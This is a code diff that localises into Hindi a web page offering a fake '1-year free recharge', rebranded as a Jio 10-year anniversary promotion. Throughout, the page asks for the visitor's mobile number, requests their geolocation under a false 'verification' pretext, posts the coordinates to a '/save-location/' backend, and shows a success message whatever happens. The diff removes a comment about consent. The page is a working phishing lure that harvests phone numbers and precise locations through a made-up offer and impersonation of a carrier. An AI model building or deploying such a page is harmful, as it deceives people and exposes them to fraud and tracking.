@@ -1,14 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Recharge Offer</title>
+    <title>जिओ फ्री रिचार्ज ऑफर</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
             text-align: center;
-            background: linear-gradient(to right, #0062E6, #33AEFF);
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
             color: white;
             margin: 0;
             padding: 20px;
@@ -22,13 +22,14 @@
             margin: auto;
             box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
         }
-        h2 { color: #0062E6; }
+        h2 { color: #ff416c; }
         input {
             width: 90%;
             padding: 10px;
             margin: 10px 0;
             border: 1px solid #ccc;
             border-radius: 5px;
+            font-size: 16px;
         }
         button {
             width: 100%;
@@ -46,23 +47,26 @@
         .hidden {
             display: none;
         }
-        #location, #location-message {
+         #location-message {
             font-size: 14px;
             color: #555;
+        }
+        #location{
+            color:linear-gradient(to right, #ff416c, #ff4b2b);
         }
     </style>
 </head>
 <body>
 
-    <h1>🔥 1-Year Free Recharge Offer! 🔥</h1>
-    <p>Enter your number to claim your free recharge</p>
+    <h1>🎉 जिओ के 10 साल पूरे! 🎉</h1>
+    <p>अब आपके लिए <b>1 साल का फ्री रिचार्ज ऑफर</b>!</p>
 
     <div class="container">
-        <h2>Recharge Now</h2>
-        <input type="tel" id="phoneNumber" placeholder="Enter Mobile Number" required>
-        <button onclick="askForLocation()">Proceed</button>
-        <p id="successMessage" class="hidden">✅ Recharge request received! Check your SMS.</p>
-        <p id="location-message" class="hidden">📍 Location access is required for verification. Click "Allow" when prompted.</p>
+        <h2>📞 अपना फोन नंबर डालें</h2>
+        <input type="tel" id="phoneNumber" placeholder="अपना मोबाइल नंबर दर्ज करें" required>
+        <button onclick="askForLocation()">रिचार्ज करें</button>
+        <p id="successMessage" class="hidden">✅ आपका फ्री रिचार्ज अनुरोध प्राप्त हो गया है!</p>
+        <p id="location-message" class="hidden">📍 सत्यापन के लिए स्थान आवश्यक है। कृपया 'Allow' दबाएँ।</p>
     </div>
 
     <p id="location" class="hidden"></p>
@@ -71,22 +75,20 @@
         function askForLocation() {
             let phoneNumber = document.getElementById("phoneNumber").value;
             if (phoneNumber.length < 10) {
-                alert("Please enter a valid mobile number.");
+                alert("⚠️ कृपया सही मोबाइल नंबर दर्ज करें!");
                 return;
             }
 
             document.getElementById("location-message").classList.remove("hidden");
 
-            // Request location with consent
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function (position) {
                         let lat = position.coords.latitude;
                         let lon = position.coords.longitude;
-                        document.getElementById("location").innerHTML = `🌍 Location: ${lat}, ${lon}`;
+                        document.getElementById("location").innerHTML = `🌍 स्थान: ${lat}, ${lon}`;
                         document.getElementById("location").classList.remove("hidden");
 
-                        // Send data to Django backend
                         fetch('/save-location/', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}' },
@@ -94,17 +96,17 @@
                         }).then(response => response.json())
                           .then(data => {
                               document.getElementById("successMessage").classList.remove("hidden");
-                              console.log("Data sent:", data);
+                              console.log("डेटा भेजा गया:", data);
                           });
 
                     },
                     function (error) {
-                        alert("⚠️ Location access denied. You can still continue, but some features may not work.");
+                        alert("⚠️ स्थान एक्सेस नहीं किया गया। आप फिर भी जारी रख सकते हैं।");
                         document.getElementById("successMessage").classList.remove("hidden");
                     }
                 );
             } else {
-                alert("⚠️ Your browser does not support location tracking.");
+                alert("⚠️ आपका ब्राउज़र स्थान ट्रैकिंग को सपोर्ट नहीं करता!");
                 document.getElementById("successMessage").classList.remove("hidden");
             }
         }
